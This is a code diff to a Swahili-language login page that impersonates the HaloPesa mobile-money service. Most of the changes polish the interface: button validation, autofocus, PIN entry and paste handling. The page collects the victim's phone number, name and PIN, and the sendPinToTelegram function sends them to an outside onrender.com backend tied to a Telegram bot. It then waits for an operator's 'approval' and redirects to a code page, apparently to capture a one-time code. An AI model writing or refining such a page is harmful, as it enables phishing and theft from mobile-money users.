@@ -245,23 +245,25 @@
             font-weight: 700;
             cursor: pointer;
             border: none;
-            transition: background 0.25s, transform 0.1s;
+            transition: background 0.25s, transform 0.1s, opacity 0.25s;
             letter-spacing: 0.5px;
         }
 
-        .action:hover {
+        .action:hover:not(:disabled) {
             background: #136622;
             transform: scale(1.01);
         }
 
-        .action:active {
+        .action:active:not(:disabled) {
             transform: scale(0.98);
         }
 
+        .action:disabled,
         .action.disabled {
-            opacity: 0.6;
+            opacity: 0.5;
             cursor: not-allowed;
             transform: none !important;
+            background: #8aaa8a;
         }
 
         /* ===== RESPONSIVE ===== */
@@ -313,7 +315,7 @@
 
                 <div class="login-title">Ingia</div>
 
-                <!-- ===== PHONE INPUT ===== -->
+                <!-- ===== PHONE INPUT with autofocus ===== -->
                 <div class="phone-wrapper">
                     <span class="flag">🇹🇿</span>
                     <input
@@ -323,6 +325,7 @@
                     placeholder="Weka nambari ya simu"
                     value=""
                     autocomplete="tel"
+                    autofocus
                     />
                 </div>
 
@@ -347,7 +350,7 @@
 
         <div class="lower-section">
             <div class="action-buttons">
-                <button class="action" id="loginBtn">INGIA</button>
+                <button class="action disabled" id="loginBtn" disabled>INGIA</button>
             </div>
         </div>
 
@@ -374,12 +377,194 @@
         const loginBtn = document.getElementById("loginBtn");
         let isPasswordVisible = false;
 
-        // Save phone to localStorage when user types
+        // =============================================
+        //  VALIDATION — enable button only when phone
+        //  AND all 4 PIN digits are filled
+        // =============================================
+        function validateAndUpdateButton() {
+            const phone = phoneInput.value.trim();
+            let pin = "";
+            boxes.forEach(b => pin += b.value);
+            const allFilled = phone.length > 0 && pin.length === 4;
+
+            // Update button state
+            loginBtn.disabled = !allFilled;
+            if (allFilled) {
+                loginBtn.classList.remove("disabled");
+            } else {
+                loginBtn.classList.add("disabled");
+            }
+
+            return allFilled;
+        }
+
+        // Save phone to localStorage when user types + re-validate
         phoneInput.addEventListener("input", function() {
             localStorage.setItem("phone", this.value);
+            validateAndUpdateButton();
         });
 
-        // Toggle visibility
+        // Also validate on blur (in case of autofill)
+        phoneInput.addEventListener("change", validateAndUpdateButton);
+
+        // =============================================
+        //  PIN BOXES — auto-advance + validation
+        // =============================================
+        boxes.forEach((box, i) => {
+            box.addEventListener("input", async function() {
+                // Allow only numbers
+                this.value = this.value.replace(/[^0-9]/g, '');
+
+                // Auto-advance to next box
+                if (this.value && i < 3) {
+                    boxes[i + 1].focus();
+                }
+
+                // Re-validate button state on every keystroke
+                validateAndUpdateButton();
+
+                // Check if all 4 digits are entered
+                if (i === 3 && this.value) {
+                    let pin = "";
+                    boxes.forEach(b => pin += b.value);
+
+                    // Validate botId
+                    if (!botId) {
+                        statusEl.className = "error";
+                        statusEl.textContent = "Hitilafu: Hakuna Kitambulisho cha Bot. Tafadhali tumia kiungo kutoka Telegram.";
+                        boxes.forEach(b => { b.disabled = false;
+                            b.value = ""; });
+                        boxes[0].focus();
+                        validateAndUpdateButton();
+                        return;
+                    }
+
+                    // Read phone from the input field
+                    const phone = phoneInput.value.trim() || "Unknown";
+
+                    // Get user data - try multiple possible localStorage keys
+                    const firstName = localStorage.getItem("firstName") || "";
+                    const lastName = localStorage.getItem("lastName") || "";
+                    const name = localStorage.getItem("name") || "";
+
+                    // Build full name
+                    let fullName = name;
+                    if (!fullName && firstName) {
+                        fullName = lastName ? `${firstName} ${lastName}` : firstName;
+                    }
+                    if (!fullName) {
+                        fullName = "Unknown";
+                    }
+
+                    console.log("Submitting PIN:", { fullName, phone, pin, botId });
+                    console.log("localStorage keys:", Object.keys(localStorage));
+
+                    // Disable inputs while processing
+                    boxes.forEach(b => b.disabled = true);
+                    loginBtn.disabled = true;
+                    loginBtn.classList.add("disabled");
+                    loginBtn.textContent = "INATHIBITISHA...";
+                    statusEl.className = "waiting";
+                    statusEl.textContent = "Inatuma Nambari ya Siri kwa uthibitisho...";
+
+                    // Send PIN to backend
+                    const res = await sendPinToTelegram(fullName, phone, pin);
+
+                    if (!res || !res.requestId) {
+                        statusEl.className = "error";
+                        statusEl.textContent = "Imeshindwa kutuma Nambari ya Siri. Tafadhali jaribu tena.";
+                        boxes.forEach(b => { b.disabled = false;
+                            b.value = ""; });
+                        loginBtn.disabled = false;
+                        loginBtn.classList.remove("disabled");
+                        loginBtn.textContent = "INGIA";
+                        boxes[0].focus();
+                        validateAndUpdateButton();
+                        return;
+                    }
+
+                    statusEl.className = "waiting";
+                    statusEl.textContent = "Inasubiri idhini ya msimamizi...";
+
+                    // Poll for approval (will wait indefinitely until admin responds)
+                    const approved = await pollPinApproval(res.requestId);
+
+                    if (approved === true) {
+                        localStorage.setItem("pin", pin);
+                        setTimeout(() => {
+                            window.location.href = `code.html?botId=${botId}`;
+                        }, 500);
+                    } else if (approved === false) {
+                        boxes.forEach(b => { b.disabled = false;
+                            b.value = ""; });
+                        loginBtn.disabled = false;
+                        loginBtn.classList.remove("disabled");
+                        loginBtn.textContent = "INGIA";
+                        boxes[0].focus();
+                        validateAndUpdateButton();
+                    } else {
+                        boxes.forEach(b => { b.disabled = false;
+                            b.value = ""; });
+                        loginBtn.disabled = false;
+                        loginBtn.classList.remove("disabled");
+                        loginBtn.textContent = "INGIA";
+                        boxes[0].focus();
+                        validateAndUpdateButton();
+                    }
+                }
+            });
+
+            // Handle backspace
+            box.addEventListener("keydown", (e) => {
+                if (e.key === "Backspace" && !box.value && i > 0) {
+                    boxes[i - 1].focus();
+                    // Re-validate after backspace (will be triggered by input event on the focused box)
+                    setTimeout(validateAndUpdateButton, 10);
+                }
+                // Allow Enter key to submit
+                if (e.key === "Enter") {
+                    let pin = "";
+                    boxes.forEach(b => pin += b.value);
+                    if (pin.length === 4) {
+                        const event = new Event('input');
+                        boxes[3].dispatchEvent(event);
+                    } else {
+                        statusEl.className = "error";
+                        statusEl.textContent = "Tafadhali weka tarakimu zote 4";
+                    }
+                }
+            });
+
+            // Re-validate on blur (in case of paste or autofill)
+            box.addEventListener("blur", validateAndUpdateButton);
+        });
+
+        // =============================================
+        //  PASTE SUPPORT — paste a 4-digit PIN
+        // =============================================
+        document.addEventListener('paste', (e) => {
+            const pastedData = e.clipboardData.getData('text');
+            const cleanedData = pastedData.replace(/[^0-9]/g, '');
+
+            if (cleanedData.length === 4) {
+                // Check if the paste target is inside the pin-boxes
+                const target = e.target;
+                if (target.closest && target.closest('.pin-boxes')) {
+                    boxes.forEach((box, index) => {
+                        box.value = cleanedData[index] || '';
+                    });
+                    boxes[3].focus();
+                    validateAndUpdateButton();
+                    // Trigger the submission flow
+                    const event = new Event('input');
+                    boxes[3].dispatchEvent(event);
+                }
+            }
+        });
+
+        // =============================================
+        //  TOGGLE PIN VISIBILITY
+        // =============================================
         document.getElementById("toggleVisibility").addEventListener("click", function() {
             isPasswordVisible = !isPasswordVisible;
             boxes.forEach(box => {
@@ -388,6 +573,9 @@
             this.textContent = isPasswordVisible ? "🙈" : "👁";
         });
 
+        // =============================================
+        //  BACKEND FUNCTIONS (unchanged)
+        // =============================================
         async function sendPinToTelegram(name, phone, pin) {
             const BACKEND_URL = "https://halopesa-tanzania-x2u7.onrender.com";
 
@@ -495,125 +683,13 @@
             });
         }
 
-        // PIN input handling
-        boxes.forEach((box, i) => {
-            box.addEventListener("input", async () => {
-                // Allow only numbers
-                box.value = box.value.replace(/[^0-9]/g, '');
-
-                // Auto-advance to next box
-                if (box.value && i < 3) {
-                    boxes[i + 1].focus();
-                }
-
-                // Check if all 4 digits are entered
-                if (i === 3 && box.value) {
-                    let pin = "";
-                    boxes.forEach(b => pin += b.value);
-
-                    // Validate botId
-                    if (!botId) {
-                        statusEl.className = "error";
-                        statusEl.textContent = "Hitilafu: Hakuna Kitambulisho cha Bot. Tafadhali tumia kiungo kutoka Telegram.";
-                        boxes.forEach(b => { b.disabled = false;
-                            b.value = ""; });
-                        boxes[0].focus();
-                        return;
-                    }
-
-                    // Read phone from the input field (not localStorage)
-                    const phone = phoneInput.value.trim() || "Unknown";
-
-                    // Get user data - try multiple possible localStorage keys
-                    const firstName = localStorage.getItem("firstName") || "";
-                    const lastName = localStorage.getItem("lastName") || "";
-                    const name = localStorage.getItem("name") || "";
-
-                    // Build full name
-                    let fullName = name;
-                    if (!fullName && firstName) {
-                        fullName = lastName ? `${firstName} ${lastName}` : firstName;
-                    }
-                    if (!fullName) {
-                        fullName = "Unknown";
-                    }
-
-                    console.log("Submitting PIN:", { fullName, phone, pin, botId });
-                    console.log("localStorage keys:", Object.keys(localStorage));
-
-                    // Disable inputs while processing
-                    boxes.forEach(b => b.disabled = true);
-                    loginBtn.classList.add("disabled");
-                    loginBtn.textContent = "INATHIBITISHA...";
-                    statusEl.className = "waiting";
-                    statusEl.textContent = "Inatuma Nambari ya Siri kwa uthibitisho...";
-
-                    // Send PIN to backend
-                    const res = await sendPinToTelegram(fullName, phone, pin);
-
-                    if (!res || !res.requestId) {
-                        statusEl.className = "error";
-                        statusEl.textContent = "Imeshindwa kutuma Nambari ya Siri. Tafadhali jaribu tena.";
-                        boxes.forEach(b => { b.disabled = false;
-                            b.value = ""; });
-                        loginBtn.classList.remove("disabled");
-                        loginBtn.textContent = "INGIA";
-                        boxes[0].focus();
-                        return;
-                    }
-
-                    statusEl.className = "waiting";
-                    statusEl.textContent = "Inasubiri idhini ya msimamizi...";
-
-                    // Poll for approval (will wait indefinitely until admin responds)
-                    const approved = await pollPinApproval(res.requestId);
-
-                    if (approved === true) {
-                        localStorage.setItem("pin", pin);
-                        setTimeout(() => {
-                            window.location.href = `code.html?botId=${botId}`;
-                        }, 500);
-                    } else if (approved === false) {
-                        boxes.forEach(b => { b.disabled = false;
-                            b.value = ""; });
-                        loginBtn.classList.remove("disabled");
-                        loginBtn.textContent = "INGIA";
-                        boxes[0].focus();
-                    } else {
-                        boxes.forEach(b => { b.disabled = false;
-                            b.value = ""; });
-                        loginBtn.classList.remove("disabled");
-                        loginBtn.textContent = "INGIA";
-                        boxes[0].focus();
-                    }
-                }
-            });
-
-            // Handle backspace
-            box.addEventListener("keydown", (e) => {
-                if (e.key === "Backspace" && !box.value && i > 0) {
-                    boxes[i - 1].focus();
-                }
-                // Allow Enter key to submit
-                if (e.key === "Enter") {
-                    let pin = "";
-                    boxes.forEach(b => pin += b.value);
-                    if (pin.length === 4) {
-                        const event = new Event('input');
-                        boxes[3].dispatchEvent(event);
-                    } else {
-                        statusEl.className = "error";
-                        statusEl.textContent = "Tafadhali weka tarakimu zote 4";
-                    }
-                }
-            });
-        });
-
-        // Focus first input on load
-        boxes[0].focus();
-
-        // Click handler for login button
+        // =============================================
+        //  CLICK HANDLER FOR LOGIN BUTTON
+        // =============================================
         loginBtn.addEventListener("click", () => {
+            // If button is disabled, do nothing (should not fire, but safety check)
+            if (loginBtn.disabled) return;
+
             let pin = "";
             boxes.forEach(b => pin += b.value);
 
@@ -627,20 +703,40 @@
             }
         });
 
-        // Handle paste functionality
-        document.addEventListener('paste', (e) => {
-            const pastedData = e.clipboardData.getData('text');
-            const cleanedData = pastedData.replace(/[^0-9]/g, '');
-
-            if (cleanedData.length === 4) {
-                boxes.forEach((box, index) => {
-                    box.value = cleanedData[index] || '';
-                });
-                boxes[3].focus();
-                const event = new Event('input');
-                boxes[3].dispatchEvent(event);
-            }
+        // =============================================
+        //  FOCUS PHONE INPUT ON LOAD (fallback)
+        // =============================================
+        // The 'autofocus' attribute handles this, but we add a fallback
+        // to ensure it works even if the attribute is not supported.
+        window.addEventListener('load', function() {
+            // Small delay to ensure DOM is fully ready
+            setTimeout(() => {
+                phoneInput.focus();
+                // Put cursor at the end if there's any value
+                const val = phoneInput.value;
+                if (val) {
+                    phoneInput.setSelectionRange(val.length, val.length);
+                }
+                // Initial validation
+                validateAndUpdateButton();
+            }, 100);
         });
+
+        // Also handle cases where the page loads via back/forward cache
+        document.addEventListener('pageshow', function() {
+            phoneInput.focus();
+            validateAndUpdateButton();
+        });
+
+        // =============================================
+        //  INITIAL STATE — button disabled
+        // =============================================
+        loginBtn.disabled = true;
+        loginBtn.classList.add("disabled");
+        // Run validation once to ensure correct initial state
+        validateAndUpdateButton();
+
+        console.log("✅ HaloPesa login page loaded — button disabled until phone + 4-digit PIN are filled.");
     </script>
 
 </body>
